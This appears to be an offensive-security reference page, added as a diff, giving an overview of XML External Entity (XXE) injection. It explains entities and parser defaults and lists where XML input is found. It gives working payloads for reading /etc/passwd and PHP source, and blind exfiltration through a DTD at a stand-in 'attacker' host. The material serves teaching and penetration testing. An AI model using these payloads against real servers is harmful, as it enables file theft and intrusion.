@@ -1,0 +1,174 @@
+---
+title: XXE
+description: Operator reference for XML External Entity injection - when a parser processes attacker-controlled XML with external-entity resolution enabled, granting file-read, SSRF, RCE (via expect://), and entity-expansion DoS primitives.
+mitre: [T1190, T1213, T1083, T1499]
+d3fend: [D3-IAA, D3-MENCR]
+impact: [DataExfil, FileRead, SSRF, RCE, DoS]
+owasp: [A05, A04]
+sidebar:
+  order: 1
+  label: Overview
+---
+
+## TL;DR
+
+When a web app processes XML from user input and the parser has external-entity resolution enabled, the operator can declare entities that point at server-side resources - local files, internal URLs, or even (with PHP's `expect://`) shell commands. The vulnerability is mostly a function of using an outdated or poorly-configured XML library.
+
+```
+# 1. Find an XML input surface (SOAP, REST-with-XML, form data with Content-Type: application/xml,
+#    SVG upload, DOCX/XLSX upload, anywhere "Content-Type: text/xml" or "application/xml" appears)
+
+# 2. Prove entity resolution works
+<!DOCTYPE foo [<!ENTITY test "PROOF">]>
+<root><field>&test;</field></root>
+# → if the response reflects "PROOF" where the entity was, you're in
+
+# 3. Read local file
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><field>&xxe;</field></root>
+
+# 4. Read source code via PHP filter wrapper
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
+]>
+<root><field>&xxe;</field></root>
+
+# 5. Blind exfil via out-of-band DTD
+<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker/x.dtd">%remote;%oob;]>
+```
+
+Success indicator: a file's contents (or its base64 encoding) appears in the application's response, or the attacker's listener receives an HTTP/DNS callback containing the file's contents.
+
+## XML in one minute
+
+XML is a structured text format using tags to nest elements:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<email>
+  <sender>john@inlanefreight.com</sender>
+  <recipients>
+    <to>HR@inlanefreight.com</to>
+  </recipients>
+  <body>Hello, kindly share the invoice...</body>
+</email>
+```
+
+Key concepts:
+
+| Concept | Example | Notes |
+| --- | --- | --- |
+| **Declaration** | `<?xml version="1.0" encoding="UTF-8"?>` | First line; defines XML version and encoding |
+| **Element** | `<sender>...</sender>` | Tag pair around content |
+| **Attribute** | `<email type="invoice">` | Key-value pairs on tags |
+| **Entity** | `&amp;`, `&lt;`, `&company;` | Named placeholder; resolved at parse time |
+| **DTD** (Document Type Definition) | `<!DOCTYPE foo [ ... ]>` | Schema and entity declarations |
+
+The entity machinery is what makes XXE possible. An entity is a variable in XML - declared in the DTD, referenced in the document body with `&name;`. The XML parser performs the substitution at parse time.
+
+### Internal entities
+
+Declared and used in the same document:
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY greeting "Hello world">
+]>
+<message>&greeting;</message>
+```
+
+Parser resolves `&greeting;` to `Hello world` before the application sees the parsed XML. No security implication on its own.
+
+### External entities - the vulnerability
+
+Entities can point at *external* resources:
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<message>&xxe;</message>
+```
+
+When the parser resolves `&xxe;`, it reads `/etc/passwd` from disk and substitutes the file contents. The application then renders `<message>` containing the full passwd file. Vulnerability primitive: arbitrary file read.
+
+### Parameter entities
+
+A second class of entities, prefixed with `%`, that can only be referenced inside the DTD:
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % wrapper "<!ENTITY exfil SYSTEM 'http://attacker/?%file;'>">
+  %wrapper;
+]>
+<message>&exfil;</message>
+```
+
+Parameter entities can be joined with other entities in ways general entities cannot. This is the mechanism for out-of-band exfiltration when the application doesn't echo entity content back - see [Blind exfil](/codex/web/xxe/blind-exfil/).
+
+## Why XXE exists
+
+XML parsers historically resolved external entities by default. The XML 1.0 spec doesn't forbid it; security-conscious settings are opt-in. So apps using older XML libraries (libxml2 before 2.9, Java's pre-2.0 SAX, .NET XmlReader without `XmlResolver = null`) inherit the unsafe default.
+
+Modern parsers default to *disabled* external entities. But:
+
+- Many legacy apps still run on outdated XML stacks
+- Some apps re-enable external entities for legitimate reasons (XML schema validation against external schemas) without realizing the implications
+- Document-processing chains (SVG → image, DOCX → text extraction) may invoke XML parsing transitively in components the developer doesn't think of as "XML parsers"
+
+The result: XXE remains common enough that OWASP lists it under A05:2021 (Security Misconfiguration) and A04:2021 (Insecure Design) - see also its prior dedicated A4:2017 ranking.
+
+## Where to find XML input
+
+| Surface | Indicator |
+| --- | --- |
+| **SOAP API** | `Content-Type: text/xml; charset=utf-8`, `SOAPAction:` header |
+| **REST with XML body** | `Content-Type: application/xml` (sometimes accepted alongside JSON via content negotiation) |
+| **RSS/Atom feed ingestion** | "Subscribe to feed", URL-input fields that fetch XML |
+| **SVG upload** | SVG is XML; image-processors may parse it as XML |
+| **DOCX / XLSX / ODT upload** | Office documents are ZIP archives of XML; some servers parse the embedded XML |
+| **Web form with XML body** | Some apps switched from forms to XML internally but kept the form UI |
+| **WS-Trust / SAML / WS-Federation** | All XML-based protocols |
+| **JNLP, BPMN, OWL, KML, GPX** | Niche XML formats; each is a potential XXE surface |
+
+The "JSON API accepts XML on Content-Type swap" case is worth emphasizing. Some servers parse the body based on the Content-Type header - sending the same data but with `Content-Type: application/xml` instead of `application/json` and converting the body to XML can find unanticipated XML parsing paths.
+
+## Attack outcomes
+
+What XXE produces depends on the parser and the application:
+
+| Outcome | Requirement | Where covered |
+| --- | --- | --- |
+| **File read (response-reflected)** | Entity content is echoed in response | [File disclosure](/codex/web/xxe/file-disclosure/) |
+| **File read (blind)** | No reflection, but parser supports parameter entities and external HTTP | [Blind exfil](/codex/web/xxe/blind-exfil/) |
+| **Source-code read** | PHP target (via `php://filter`) or Java directory listing | [File disclosure](/codex/web/xxe/file-disclosure/) |
+| **SSRF** | Parser supports HTTP schemes (`http://`, `https://`) | [RCE and SSRF](/codex/web/xxe/rce-and-ssrf/) |
+| **RCE** | PHP `expect://` wrapper enabled (uncommon in modern installs) | [RCE and SSRF](/codex/web/xxe/rce-and-ssrf/) |
+| **DoS via entity expansion** | Modern parsers prevent; older ones don't | [RCE and SSRF](/codex/web/xxe/rce-and-ssrf/) |
+| **Windows hash theft** | Windows host parsing UNC paths via `\\attacker\share\file` | Brief in [RCE and SSRF](/codex/web/xxe/rce-and-ssrf/) |
+
+The most common deliverable is file read - extracting `/etc/passwd`, configuration files with DB credentials, source code, SSH keys. From there, the engagement often pivots to lateral movement using harvested credentials.
+
+## What this cluster covers
+
+| Page | Focus |
+| --- | --- |
+| [Identifying](/codex/web/xxe/identifying/) | Finding XML surfaces, the JSON-to-XML Content-Type pivot, the `<!ENTITY test "value">` reflection probe |
+| [File disclosure](/codex/web/xxe/file-disclosure/) | Basic `file://`, source-code via `php://filter/convert.base64-encode`, Java directory listing, high-value file targets |
+| [Blind exfil](/codex/web/xxe/blind-exfil/) | CDATA wrap via external parameter entities, error-based exfil, full out-of-band HTTP exfil with hosted DTD |
+| [RCE and SSRF](/codex/web/xxe/rce-and-ssrf/) | PHP `expect://` to webshell drop, internal port scanning, billion-laughs DoS, Windows UNC hash theft |
+| [Automation](/codex/web/xxe/automation/) | XXEinjector tool walkthrough, request-file format, automated CDATA/error/OOB modes |
+| [Skill assessment chain](/codex/web/xxe/skill-assessment-chain/) | Capstone walkthrough - IDOR + verb tampering + XXE combining to read `/flag.php` |
+
+## Cross-cluster references
+
+| Topic | Page |
+| --- | --- |
+| Reaching XXE via XSLT injection | [XSLT injection](/codex/web/server-side/xslt/) |
+| Reaching XXE via SVG upload | [Limited uploads](/codex/web/uploads/limited-uploads/) |
+| SSRF as a primary class (XXE-SSRF is one delivery mechanism) | [SSRF cluster](/codex/web/server-side/ssrf/) |
+| File-read patterns analogous to XXE | [LFI cluster](/codex/web/lfi/) |
+| Chained SOAP → XXE attacks | [SSRF chained](/codex/web/server-side/ssrf/chained/) |
+| Verb tampering inside XML endpoints | [Verb tampering](/codex/web/auth/verb-tampering/) |
+| IDOR-protected XML endpoints (admin-only event creation, etc.) | [IDOR cluster](/codex/web/idor/) |
